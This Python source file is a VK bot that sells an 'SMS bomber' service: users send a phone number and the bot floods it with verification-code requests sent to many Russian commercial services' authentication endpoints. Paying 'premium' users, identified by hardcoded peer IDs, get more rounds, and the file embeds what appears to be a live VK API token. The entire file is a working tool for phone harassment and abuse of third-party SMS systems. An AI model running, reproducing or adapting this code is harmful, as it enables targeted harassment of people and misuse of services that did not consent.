import vk_api, random
from vk_api.bot_longpoll import VkBotLongPoll, VkBotEventType
import requests
import random
import datetime
import sys
import re
import time
import datetime
import json
import threading
from threading import Thread
from colorama import Fore, Back, Style
from random import randint

token = "7fec2637a00df235aef1b31ef093509113153bf8aefad563b924ded337d3c297fd5c7662af96547891841"
vk = vk_api.VkApi(token=token) 
vk._auth_token()
longpoll = VkBotLongPoll(vk, 188206798) 

print("Бот запущен") 
def mask(strs, maska):
	if len(str(strs)) == maska.count('#'):
		str_list = list(str(strs))
		for i in str_list:
			maska=maska.replace("#", i, 1)
		return maska

def checkproxy(ip, prox):
	try:
		ipx = requests.get("http://fsystem88.ru/ip", proxies={'http': "http://{}".format(prox), 'https':"http://{}".format(prox)}, verify=False, timeout=10).text
	except:
		ipx = ip
	if ip != ipx:
		f = open("proxies.txt", "a+")
		f.write("{}\n".format(prox))
		f.close()

def b():	
	phone1 = list(phone);	
	phone9 = phone1[1:]
	requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
	# НОВЫЙ
	requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
	#f
	requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
	requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
	cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
	requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
	# НОВЫЙ КОНЕЦ
	requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
	# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
	requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
	requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
	requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
	
	requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
	requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
	requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
	requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)

	if peer_id == 555422592:
		phone9 = phone1[1:]
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
	if peer_id == 460809808:
		phone9 = phone1[1:]
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
	if peer_id == 622423647:
		phone9 = phone1[1:]
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
	if peer_id == 514440332:
		phone9 = phone1[1:]
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
		phone1 = list(phone);	
		requests.post("https://youla.ru/web-api/auth/request_code", data={"phone": "8"+phone}, timeout=10)
		# НОВЫЙ
		requests.post("https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms",json={"phone": "+7"+phone}, timeout=10)
		#f
		requests.post("https://api-prime.anytime.global/api/v2/auth/sendVerificationCode",data={"phone": phone}, timeout=10)
		requests.post("https://piroginomerodin.ru/index.php?route=sms/login/sendreg",data={"telephone": "+7"+phone}, timeout=10)
		cookies_dc = requests.get('https://api.delivery-club.ru/api1.2/user/login').cookies.get_dict()
		requests.post('https://api.delivery-club.ru/api1.2/user/otp', data={'phone': "+7"+phone}, cookies = cookies_dc) 
		# НОВЫЙ КОНЕЦ
		requests.post("https://zoloto585.ru/api/bcard/reg/", json={"name":"","surname":"","patronymic":"","sex":"m","birthdate":"..","phone":phone,"email":"","city":""}, timeout=10)
		# requests.post("https://3040.com.ua/taxi-ordering", data={"callback-phone": phone}, timeout=10)
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+7"+phone}, timeout=10)
		requests.post("https://www.citilink.ru/registration/confirm/phone/+7{phone}/", data={}, timeout=10)
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={"msisdn": "+7"+phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"}, timeout=10)
		phone9 = phone1[1:]
		requests.post("https://rutaxi.ru/ajax_auth.html", data={"l": phone9, "c": "3"}, timeout=10)
		requests.post("https://api.sunlight.net/v3/customers/authorization/",data={"phone": "+7"+phone}, timeout=10)
		requests.post("https://m.tiktok.com/node-a/send/download_link",json={"slideVerify":0,"language":"ru","PhoneRegionCode":"7","Mobile":phone9,"page":{"pageName":"home","launchMode":"direct","trafficType":""}}, timeout=10)
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code",params={"msisdn": "+7"+phone}, timeout=10)
def sendmsg(msg):
	vk.method("messages.send", { "peer_id": peer_id, "message": msg, "random_id": random.randint(1, 2147483647)})
def sub(user_id):
    if api.groups.isMember(access_token = token, group_id = 188206798,user_id = user_id):
        return 1
    return 0

while True: 
		for event in longpoll.listen():
			if event.type == VkBotEventType.MESSAGE_NEW:
				message = event.obj['message'] 
				peer_id = message['peer_id']
				text = message['text']
				text1 = list(text);							
				user = vk.method("users.get", {"user_ids": peer_id})
				fullname = user[0]['first_name'] +  ' ' + user[0]['last_name']
				sendmsg("Если вы еще не подписались на нашу группу, то советуем сделать это прямо сейчас!")
				# sendmsg("Отключение серверов!\n1 Июня в 12:00.Однопоточные сервера бота будут отключены(Бесплатная версия бота).\nИ 5 Июня в 11:00.Будут отключены многопоточные сервера!(Премиум версия)\nЭто значит что бот будет закрыт:(\nУстроена масштабная распродажа Премиумов!.\nПокупка премиума будет не доступна 5 мая!\n1 Июня всем кто зарегистрировался до 6 апреля будет выдан премиум")
				if text == "pid":
					sendmsg(peer_id)
				elif text == "поддержка":
					sendmsg("Администратор Вызван! Введите текст своего обращения")
					pidd = str(peer_id)
					vk.method("messages.send", { "peer_id": 557469128, "message": "Вас вызвал пользователь!:"+fullname, "random_id": random.randint(1, 2147483647)})
					print("Пользователь:"+fullname+" Вызвал Админа")
				elif text == "Поддержка":
					sendmsg("Администратор Вызван! Введите текст своего обращения")
					pidd = str(peer_id)
					vk.method("messages.send", { "peer_id": 557469128, "message": "Вас вызвал пользователь!:"+fullname, "random_id": random.randint(1, 2147483647)})
					print("Пользователь:"+fullname+" Вызвал Админа")
				elif text == "Стоп":
					sendmsg("Остановленно!")
				elif text == "стоп":
					sendmsg("Остановленно!")
				elif text1[0] != "9":
					sendmsg("Неверный формат! Напишите номер без восьмерки! \nПример : 9613782121")
					break
				elif text == "/help":
					sendmsg("Для начала атаки напишите номер телефона\nДля связи с админом напишите 'Поддержка'")
				elif text != "/help":
					if peer_id == 557469128:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [50 кругов]\n")
						b()
						break
					if peer_id == 555422592:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [50 кругов]\n")
						b()
						break
					if peer_id == 460809808:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [50 кругов]\n")
						b()
						break
					if peer_id == 622423647:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉31 день")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [50 кругов]\n")
						b()
						break
					if peer_id == 514440332:
						phone = text
						sendmsg("premium detected")
						sendmsg("Спам на номер: "+phone+" Запущен [50 кругов]\nPremium Status активен!\nДо Конца Подписки Осталось 👉2 дня")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [50 кругов]\n")
						b()
						break
					if text == "79604049192":
						sendmsg("Ошибка!")
						break
					if text == "89604049192":
						sendmsg("Ошибка!")
						break
					if text == "89015773048":
						sendmsg("Ошибка!")
						break
					else:
						phone = text
						sendmsg("Спам на номер: "+phone+" Запущен [1 круг]\nНа сегодня тебе хватит!\nСамое время покупать премиум!👉Всего 199р/мес")
						print("Пользователь:"+fullname+" Запустил спам на номер: "+phone+" [1 круг]\n")
						b()
						
